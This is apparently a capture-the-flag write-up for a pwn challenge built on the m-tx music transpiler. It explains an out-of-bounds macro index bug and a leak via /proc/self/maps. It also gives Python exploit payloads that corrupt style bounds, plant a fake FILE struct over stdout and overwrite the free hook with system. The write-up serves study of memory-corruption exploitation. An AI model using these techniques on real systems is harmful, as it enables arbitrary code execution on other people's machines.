# music

We get access to wrapper that lets us repeatedly call m-tx program. m-tx is just another language that gets transpiled into tex file. originally written in pascal and then ported to C.
Worst code i've ever seen, after glibc of course. So disregard the broken formatting.

The bug is in `expandThisMacro` function. It has bounds checks but the error is soft, i.e it doesn't abort the program if we set enable `ignoreErrors` feature in the script (normally it aborts execution).


```cpp
Local void expandThisMacro(struct LOC_getNextMusWord *LINK)
{
  Char playtag[11];
  short playID;
  Char w[256];
  Char STR1[72];
  Char STR2[42];
  Char STR3[68];
  Char STR4[54];
  Char STR5[256], STR7[256];

  macroInit();
  if (strlen(LINK->note) == 1)
    error("Can't terminate a macro that has not been started", print);
  playID = identifyMacro(LINK->note);
  toString(playtag, playID);
/* p2c: mtxline.pas, line 317:
 * Note: Possible string truncation in assignment [145] */
  if (playID < 1 || playID > 99) {
    sprintf(STR2, "Macro ID %s is not in range 1..99", playtag);
    error(STR2, print);
  }
```

So, `playID` comes from untrusted source:
```cpp
Static short identifyMacro(Char *s_)
{
  Char s[256];
  short k;

  strcpy(s, s_);
  predelete(s, 2);
  getNum(s, &k);
  return k;
}
```

It's important to note here the `playID` is of type `short` which has max value of **0x7fff** in both directions - this will raise some issues later. This index will be used to index **0x100** sized char arrays in bss section.

There are two things that can be done with macro:
1. read macro value 
2. write macro value

First, the read:

```cpp
      if (debugMode()) {
	printf("Inserting macro %s text \"%s\"\n",
	       playtag, macro_text[playID-1]);
	printf("Buffer before insert: %s\n", LINK->buf);
      }
      sprintf(LINK->buf, "%s%s",
	      macro_text[playID-1], strcpy(STR5, LINK->buf));
      return;
```

Fortunately for us we can gain libc leak by reading stderr pointer which perfectly aligns with **0x100** bytes indexing, but as we will learn later there's an easier way to get leak.

Write is performed in similar manner but there's a little nuance:

```cpp
  do {
    GetNextWord(w, LINK->buf, blank, dummy);
    if (*w == '\0') {
      sprintf(STR1,
	"Macro definition %s should be terminated on the same input line",
	playtag);
      error(STR1, print);
    }
    if (!strcmp(w, "M")) {
      if (debugMode())
	printf("Macro %s is: %s\n", playtag, macro_text[playID-1]);
      break;
    }
    if (w[0] == 'M' && strlen(w) > 1) {
      if (w[1] != 'P' || identifyMacro(w) == playID) {
	sprintf(STR7, "%s not allowed inside macro definition %s", w, playtag);
	error(STR7, print);
      }
    }
    sprintf(macro_text[playID-1] + strlen(macro_text[playID-1]), "%s ", w); // < it's not just %s it's %s + " "
```

Not only we cant write null bytes but it also appends a "\x20" (whitespace) at the end so we need a bit better primitive for pointer corruption. Also no partial overwrites since it indexes by **0x100** bytes.

Before we proceed to corruptions, how do we get leaks? Simply include `/proc/self/maps`. ~~or you can also waste couple of hours by gaining better write primitive -> corrupting stylefilename variable -> including proc self maps -> dumping it from meory~~

```py
data ="L"* 0xb0

payload = """
ENABLE: debugMode
ENABLE: beVerbose
ENABLE: ignoreErrors
ENABLE: expandMacro
Style: Woodwind Violins
Violins: Voices Violini; Clefs G
Woodwind: Voices FlObCl; Clefs G
Flats: 1
meter: C

MS241 %s M

INCLUDE:/proc/self/maps
""" % ((data))

upload(10,payload)

gen(10)
```

Then, to gain write primitive we corrupt `known_styles` variable in bss through OOB macro write. This variable is used as an upper bound for style indexing:

```cpp
Static void addStyle(Char *S)
{
  style_index0 sn;
  Char STR1[256];

  sn = findStyle(NextWord(STR1, S, colon_, dummy));
  if (sn > 0) {
    strcpy(known_style[sn-1], S);
    return;
  }
  if (known_styles < max_styles) {
    known_styles++;
    strcpy(known_style[known_styles-1], S);
  } else
    error("Can't add another style - table full", print);
}

```

If we're able to get out of bound index we can write controlled data. But there's a small issue. let's check `findStyle`:

```cpp
Static style_index0 findStyle(Char *s_)
{
  style_index0 Result = 0;
  Char s[256];
  style_index0 i = 0;

  strcpy(s, s_);
  sprintf(s + strlen(s), "%c", colon_);
  while (i < known_styles) {
    i++;
    if (startsWithIgnoreCase(known_style[i-1], s))
      return i;
  }
  return Result;
}
```

the issue here is that type of iterator (`i`) is `char`:

```cpp
typedef char style_index;

typedef char style_index0;
```

What this means in practice is that if we set `known_styles` to value larger than **0x7f**  the iterator will overflow into negative value. This will result in indexing into read only memory, and that further triggers some release asserts due to stack overflow due to data stored in that segment.

So to successfully break out of this we have to hit our fake style at some point before the iterator overflow.

Fortunately for us there's only one good opportunity for fake style -just before stdout pointers! So in exploit it looks like this:

First a fake style is written out of bounds

```py
payload = """
ENABLE: debugMode
ENABLE: beVerbose
ENABLE: ignoreErrors
ENABLE: expandMacro
Style: Woodwind Violins
Woodwind: Voices FlObCl; Clefs G
Violins: Voices Violini; Clefs G
Flats: 1
meter: C

MS-175 %s M
MS-65 %s M
""" % (("A"*0xbf),(("Q"*0xc0) + "iiiiiii:" ) ) 
```


`known_styles` index is overwritten with **0x1010** this will iterate styles out of bounds next time the style is added.

```py
# patch index again, this time we go in positive direction and to stop successfully we have to hit fake entry that was prepared in first step

payload = """
Flats: 1
meter: C
Style: Woodwind
Woodwind: Voices FlObCl; Clefs G

MS-121 %s M
""" % (("A" * 0x9c ) + (p16(0x1010)+p16(0xffff))) # known_styles idx

upload(6,payload)
pause()
gen(6)
#r.interactive()

r.recvuntil("Do you want to show the result?[y/n]")
r.sendline("n")
```

Finally stdout pointer is overwritten with a fake FILE struct stored on the heap

```py
# this patches stdout pointer :)
# first write stdin pointer and then quickly do the second and third write to restore stdout ptr and plug in null bytes

#guess = 0xdeadbeeffeedface
guess = heap_ptr + 0x2420
log.info(" guess -> " + hex(guess)  )

payload = """
SUSPEND: 1
meter: C

Style: iiiiiii
iiiiiii: Voices AAAAAA; Clefs %s

%s
""" %(  (("XX") + p64(guess)),
 		p64(system))
	    #(("X" * 3 ) + p64(stdout_ptr)), # need one more null byte
	    #(("X" * 2 ) + p64(stdout_ptr)))#, # stdout
	    #( "SUSPEND\nMS-121 123 M\nRESUME"))


upload(7,payload,False)
#pause()
gen(7)
```


Fake FILE struct's buffer pointers pointing to a free hook. Then controlled data is generated in the output stream to patch the free hook with system and then free is triggered.
